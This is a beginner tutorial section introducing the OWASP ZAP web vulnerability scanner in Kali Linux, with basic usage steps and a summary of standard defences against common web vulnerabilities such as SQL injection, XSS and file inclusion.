OWASP ZAP (Zed Attack Proxy) is a free, beginner-friendly automated web vulnerability scanner built by OWASP and pre-installed in Kali Linux. It can automatically find SQLi, XSS, CSRF, file inclusion, and dozens of other vulnerabilities in a web application with a single scan.

ZAP can also be used as an intercepting proxy — like Burp Suite — to manually test and modify requests.

🤖
Automated Spider
ZAP crawls all pages and forms of a site automatically, building a full map of the target.
🔍
Active Scanner
Tests every parameter it finds for SQLi, XSS, CSRF, header injections and more.
🔄
Intercepting Proxy
Sit between your browser and the target. See and modify every request and response.
📊
Detailed Reports
Generates HTML/XML/JSON reports listing every vulnerability with severity and fix guidance.
# Launch ZAP from Kali terminal:
zaproxy

# Or find it in: Applications → Web Application Analysis → ZAP
# Quick scan — automated:
# 1. Open ZAP → enter target URL → click "Attack"
# 2. ZAP spiders the site then scans every page for vulns
# 3. Results appear in the Alerts panel (colour coded by severity)

# Using ZAP as a proxy:
# 1. Set browser proxy to 127.0.0.1:8080
# 2. Browse the target normally — ZAP records everything
# 3. Right-click any request → "Active Scan" to test just that one
# 4. Use the fuzzer to inject payloads into specific parameters
🔧
For beginners, ZAP is easier to start with than Burp Suite. Run ZAP against DVWA locally and read through the alerts it finds — it will explain each vulnerability, its severity, and how to fix it. Great way to learn both attacking and defending at the same time.
Mitigation Summary
🛡️ Web Vulnerability Mitigation Summary

As a security professional you need to understand both attack AND defence. Here's how each vulnerability class is fixed:

🔐
SQL Injection — Use parameterised statements / prepared queries. Never insert user input directly into SQL strings. Blacklists and filters can always be bypassed — only parameterisation works reliably.
📁
File Upload Vulns — Only allow safe file types. Validate both the extension AND the actual file content (magic bytes). Store uploads outside the web root. Never execute uploaded files. Rename uploads to remove original extensions.
⚙️
Code Execution — Never use dangerous functions (exec, system, shell_exec) with user input. If you must run OS commands, whitelist every allowed input value. Filter and sanitise before any execution.
📂
LFI / RFI — Disable allow_url_fopen and allow_url_include in php.ini. Use static file inclusion — never determine filenames from user input. Implement a whitelist of allowed pages.
🔀
XSS — Escape and encode all user-supplied output using htmlspecialchars(). Implement a strict Content Security Policy (CSP) header. Never insert untrusted data into HTML without encoding it first.
🔍
Information Leakage — Hide server version headers. Disable directory listing. Use custom error pages. Don't expose .git folders, backup files or config files publicly. Regularly run dirb and ZAP against your own site.
